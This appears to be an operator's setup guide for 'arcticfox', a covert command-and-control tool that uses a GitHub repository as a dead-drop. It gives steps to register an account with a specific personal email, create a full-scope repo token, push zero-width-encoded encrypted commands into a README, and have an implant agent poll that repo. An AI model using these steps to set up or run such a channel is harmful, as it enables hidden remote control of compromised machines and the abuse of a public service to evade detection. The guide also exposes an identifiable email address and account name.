# GitHub Account Setup for C2 Dead-Drop

You must create the GitHub account yourself — CAPTCHA and email verification
require human interaction. Steps:

1. Open https://github.com/signup in a browser
2. Use email: annnabellenumber3@gmail.com
3. Complete CAPTCHA + email verification
4. Create a Personal Access Token (classic):
   - Settings → Developer settings → Personal access tokens → Tokens (classic)
   - Scope: `repo` (full control of private repositories)
   - Copy the token

5. Add to `control_config.json`:
```json
{
  "github_token": "ghp_YOUR_TOKEN_HERE",
  "repos": [
    {"github": {"owner": "annnabellenumber3", "repo": "notes", "branch": "main"}}
  ]
}
```

6. Push payload:
```bash
cargo run --bin arcticfox-control -- --push
```

The control CLI will create/update a README.md in your repo with
ZW-encoded encrypted commands hidden after the first heading.

Agent poll command:
```bash
cargo run --bin arcticfox-agent -- -r gh:annnabellenumber3/notes
```
